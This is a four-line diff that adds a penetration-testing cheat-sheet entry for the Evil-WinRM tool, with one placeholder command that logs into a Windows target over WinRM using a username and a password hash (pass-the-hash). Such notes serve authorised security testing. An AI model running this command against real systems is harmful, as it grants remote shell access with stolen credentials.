@@ -1,0 +1,4 @@
+# Evil-WinRM
+
+# evil-winrm using username and hash
+evil-winrm -i <target-ip> -u <username> -H <hash>
